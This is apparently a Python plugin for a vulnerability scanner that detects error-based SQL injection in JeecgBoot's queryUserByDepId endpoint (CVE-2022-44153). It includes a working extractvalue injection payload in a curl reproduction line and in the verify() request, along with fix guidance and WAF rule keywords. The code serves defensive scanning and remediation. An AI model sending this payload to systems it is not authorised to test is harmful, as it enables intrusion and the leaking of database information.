# JeecgBoot SQL 注入（CVE-2022-44153 家族）：/sys/user/queryUserByDepId depId 参数报错注入
# 存在性验证：depId 注入单引号 + 报错函数，响应含 SQL 报错特征即确认
from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from lib.colors import no, ok
from lib.matcher import match_positive
from plugins.base import PluginBase


class JeecgSqlInjectQueryUserPlugin(PluginBase):
    name = "JeecgBoot queryUserByDepId SQL注入"
    cve = "CVE-2022-44153"
    severity = "high"
    category = "vuln"
    description = "JeecgBoot /sys/user/queryUserByDepId 的 depId 参数存在报错型 SQL 注入"
    fix = "升级 JeecgBoot 至 3.4.4+；对 depId 参数做参数化查询"
    fix_detail = (
        "【升级方案】升级至 JeecgBoot 3.4.4+（修复 queryUserByDepId 注入）\n"
        "【代码修复】SysUserController.queryUserByDepId 改用 MyBatis 参数绑定：#{depId}\n"
        "【WAF 规则】拦截 depId 参数含 extractvalue/updatexml/单引号+注释符的请求\n"
        "【合规】OWASP A03:2021 注入；等保 2.0 8.1.3"
    )
    reproduce = (
        'curl "http://target/jeecg-boot/sys/user/queryUserByDepId?depId='
        "1'%20and%20extractvalue(1,concat(0x7e,user()))--\"\n"
        "# 预期响应：错误信息含 extractvalue 与 SQL 报错关键字（XPATH syntax error 等）"
    )
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    compliance = "等保2.0:8.1.3;OWASP:A03:2021"
    vuln_type = "sqli"
    supports_waf_bypass = True

    def verify(self, target, session):
        """检测 /sys/user/queryUserByDepId 的 depId 参数是否存在报错型 SQL 注入。

        @param target: 目标站点根 URL
        @param session: 复用的 HTTP 会话
        @return: ScanResult —— 命中 CONFIRMED；未命中 SAFE；网络异常 UNKNOWN
        """
        url = join_url(
            target,
            # %20 为 URL 编码空格；末尾 -- 注释原 SQL 尾部，使 extractvalue 报错落点可控
            "/jeecg-boot/sys/user/queryUserByDepId?depId=1'%20and%20extractvalue(1,concat(0x7e,user()))--",
        )
        try:
            resp = session.get(url)
            text = resp.text or ""
        except Exception as e:
            # 网络异常归 UNKNOWN：测不到 ≠ 安全，避免漏报
            print(no("JeecgBoot queryUserByDepId SQL注入（网络异常）"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
        # 报错注入特征：extractvalue/XPATH/updatexml 任一 + 负向排除普通页面（降误报）
        # 统一小写再匹配：兼容服务端返回大小写不一的报错文案（XPath/XPATH 等变体）
        if match_positive(
            text.lower(),
            ["extractvalue", "xpath", "updatexml", "syntax error"],
            negatives=["403", "forbidden", "404 not found"],
        ):
            print(ok("存在 JeecgBoot queryUserByDepId SQL注入"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence="响应含 SQL 报错特征（extractvalue/XPATH）",
                fix=self.fix,
                extra={"vuln_type": "sqli", "plugin_name": "jeecg_sqli_query_user"},
            )
        print(no("不存在 JeecgBoot queryUserByDepId SQL注入"))
        return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url)
